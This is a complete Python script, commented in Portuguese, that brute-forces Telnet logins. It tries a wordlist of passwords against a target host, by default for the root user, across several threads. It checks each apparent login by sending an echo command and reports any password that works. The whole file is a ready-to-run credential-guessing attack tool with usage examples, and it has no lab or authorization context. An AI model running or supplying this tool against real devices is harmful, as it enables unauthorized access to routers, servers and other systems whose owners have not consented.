#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Script de Bruteforce para Serviço Telnet
Realiza tentativas de login com wordlist, incluindo detecção de falsos positivos
"""

import socket
import sys
import time
import threading
from typing import Optional, Tuple, List
from queue import Queue
import signal

class TelnetBruteforce:
    def __init__(self, host: str, port: int = 23, username: str = "root", 
                 timeout: int = 10, delay: float = 0.5, max_retries: int = 3):
        """
        Inicializa o objeto TelnetBruteforce
        
        Args:
            host: Endereço IP ou hostname do alvo
            port: Porta do serviço Telnet (padrão: 23)
            username: Nome de usuário para tentar (padrão: root)
            timeout: Timeout para conexões (padrão: 10 segundos)
            delay: Delay entre tentativas (padrão: 0.5 segundos)
            max_retries: Número máximo de tentativas em caso de erro (padrão: 3)
        """
        self.host = host
        self.port = port
        self.username = username
        self.timeout = timeout
        self.delay = delay
        self.max_retries = max_retries
        self.found_password = None
        self.attempts = 0
        self.failed_attempts = 0
        self.lock = threading.Lock()
        self.stop_flag = False
        self.false_positive_patterns = [
            b"incorrect",
            b"wrong",
            b"invalid",
            b"failed",
            b"denied",
            b"error",
            b"try again"
        ]
        self.success_patterns = [
            b"#",
            b"$",
            b">",
            b"welcome",
            b"last login",
            b"shell",
            b"cli"
        ]
    
    def connect(self) -> Optional[socket.socket]:
        """
        Estabelece conexão com o serviço Telnet
        
        Returns:
            Socket conectado ou None em caso de erro
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            return sock
        except socket.timeout:
            return None
        except socket.error:
            return None
        except Exception:
            return None
    
    def read_until(self, sock: socket.socket, pattern: bytes, timeout: float = 5.0) -> bytes:
        """
        Lê dados do socket até encontrar um padrão ou timeout
        
        Args:
            sock: Socket conectado
            pattern: Padrão a procurar
            timeout: Timeout em segundos
            
        Returns:
            Dados lidos
        """
        data = b""
        start_time = time.time()
        sock.settimeout(timeout)
        
        try:
            while time.time() - start_time < timeout:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if pattern in data:
                        break
                except socket.timeout:
                    continue
        except Exception:
            pass
        
        return data
    
    def try_login(self, password: str) -> Tuple[bool, str]:
        """
        Tenta fazer login com uma senha específica
        
        Args:
            password: Senha a ser testada
            
        Returns:
            Tupla (sucesso, mensagem)
        """
        if self.stop_flag:
            return False, "Interrompido"
        
        retries = 0
        while retries < self.max_retries:
            try:
                sock = self.connect()
                if not sock:
                    retries += 1
                    time.sleep(self.delay)
                    continue
                
                # Lê o banner inicial
                time.sleep(0.3)
                initial_data = self.read_until(sock, b"Username:", timeout=3.0)
                
                # Verifica se pede username ou já pede password
                if b"Username:" in initial_data or b"username:" in initial_data.lower():
                    # Envia username
                    sock.send((self.username + "\r\n").encode())
                    time.sleep(0.3)
                
                # Lê prompt de senha
                password_prompt = self.read_until(sock, b"Password:", timeout=3.0)
                
                if b"Password:" not in password_prompt and b"password:" not in password_prompt.lower():
                    sock.close()
                    retries += 1
                    time.sleep(self.delay)
                    continue
                
                # Envia senha
                sock.send((password + "\r\n").encode())
                time.sleep(0.5)
                
                # Lê resposta
                response = self.read_until(sock, b"#", timeout=2.0)
                
                # Verifica se é um falso positivo
                response_lower = response.lower()
                
                # Verifica padrões de erro (falsos positivos)
                for pattern in self.false_positive_patterns:
                    if pattern in response_lower:
                        sock.close()
                        with self.lock:
                            self.attempts += 1
                            self.failed_attempts += 1
                        return False, f"Senha incorreta (padrão de erro detectado)"
                
                # Verifica padrões de sucesso
                success = False
                for pattern in self.success_patterns:
                    if pattern in response_lower:
                        success = True
                        break
                
                # Verifica se recebeu prompt de comando (indicador de sucesso)
                if b"#" in response or b"$" in response or b">" in response:
                    # Verifica novamente para evitar falsos positivos
                    # Tenta enviar um comando simples para confirmar
                    time.sleep(0.2)
                    sock.send(b"echo test\r\n")
                    time.sleep(0.3)
                    confirm_response = self.read_until(sock, b"test", timeout=2.0)
                    
                    if b"test" in confirm_response:
                        sock.close()
                        with self.lock:
                            self.attempts += 1
                        self.found_password = password
                        self.stop_flag = True
                        return True, "Login bem-sucedido!"
                    else:
                        # Pode ser um falso positivo
                        sock.close()
                        with self.lock:
                            self.attempts += 1
                            self.failed_attempts += 1
                        return False, "Possível falso positivo detectado"
                
                sock.close()
                with self.lock:
                    self.attempts += 1
                    self.failed_attempts += 1
                return False, "Senha incorreta"
                
            except socket.timeout:
                retries += 1
                try:
                    sock.close()
                except:
                    pass
                time.sleep(self.delay)
            except Exception as e:
                retries += 1
                try:
                    sock.close()
                except:
                    pass
                time.sleep(self.delay)
        
        with self.lock:
            self.attempts += 1
            self.failed_attempts += 1
        return False, f"Erro após {self.max_retries} tentativas"
    
    def bruteforce(self, wordlist_path: str, threads: int = 5) -> Optional[str]:
        """
        Realiza bruteforce usando uma wordlist
        
        Args:
            wordlist_path: Caminho para o arquivo de wordlist
            threads: Número de threads paralelas (padrão: 5)
            
        Returns:
            Senha encontrada ou None
        """
        print(f"[*] Iniciando bruteforce em {self.host}:{self.port}")
        print(f"[*] Usuário: {self.username}")
        print(f"[*] Wordlist: {wordlist_path}")
        print(f"[*] Threads: {threads}")
        print(f"[*] Delay entre tentativas: {self.delay}s")
        print("-" * 60)
        
        # Lê a wordlist
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] Erro: Arquivo {wordlist_path} não encontrado")
            return None
        except Exception as e:
            print(f"[!] Erro ao ler wordlist: {e}")
            return None
        
        print(f"[*] Total de senhas na wordlist: {len(passwords)}")
        print("-" * 60)
        
        # Fila de senhas
        password_queue = Queue()
        for password in passwords:
            password_queue.put(password)
        
        # Handler para Ctrl+C
        def signal_handler(sig, frame):
            print("\n[!] Interrompido pelo usuário")
            self.stop_flag = True
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Função worker para threads
        def worker():
            while not password_queue.empty() and not self.stop_flag:
                try:
                    password = password_queue.get_nowait()
                except:
                    break
                
                if self.stop_flag:
                    break
                
                success, message = self.try_login(password)
                
                with self.lock:
                    current_attempt = self.attempts
                    if success:
                        print(f"\n[+] SENHA ENCONTRADA: {password}")
                        print(f"[+] Tentativas realizadas: {current_attempt}")
                        print(f"[+] Taxa de sucesso: {((current_attempt - self.failed_attempts) / current_attempt * 100):.2f}%")
                        return
                    else:
                        if current_attempt % 100 == 0:
                            print(f"[*] Tentativas: {current_attempt} | Testando: {password[:20]}...")
                
                time.sleep(self.delay)
                password_queue.task_done()
        
        # Inicia threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Aguarda threads terminarem
        for t in thread_list:
            t.join()
        
        print("\n" + "-" * 60)
        print(f"[*] Bruteforce concluído")
        print(f"[*] Total de tentativas: {self.attempts}")
        print(f"[*] Tentativas falhadas: {self.failed_attempts}")
        
        if self.found_password:
            print(f"[+] Senha encontrada: {self.found_password}")
            return self.found_password
        else:
            print("[!] Senha não encontrada na wordlist")
            return None


def main():
    """Função principal"""
    if len(sys.argv) < 3:
        print("Uso: python telnet_bruteforce.py <IP> <wordlist> [opções]")
        print("Exemplo: python telnet_bruteforce.py 192.168.1.1 xato_net_passwords.txt")
        print("\nOpções:")
        print("  --username USER    Nome de usuário (padrão: root)")
        print("  --port PORT        Porta (padrão: 23)")
        print("  --threads N        Número de threads (padrão: 5)")
        print("  --delay SECONDS    Delay entre tentativas (padrão: 0.5)")
        sys.exit(1)
    
    host = sys.argv[1]
    wordlist = sys.argv[2]
    
    # Parse de argumentos opcionais
    username = "root"
    port = 23
    threads = 5
    delay = 0.5
    
    i = 3
    while i < len(sys.argv):
        if sys.argv[i] == "--username" and i + 1 < len(sys.argv):
            username = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == "--port" and i + 1 < len(sys.argv):
            port = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--threads" and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--delay" and i + 1 < len(sys.argv):
            delay = float(sys.argv[i + 1])
            i += 2
        else:
            i += 1
    
    bruteforcer = TelnetBruteforce(host, port, username, delay=delay)
    result = bruteforcer.bruteforce(wordlist, threads)
    
    if result:
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == "__main__":
    main()

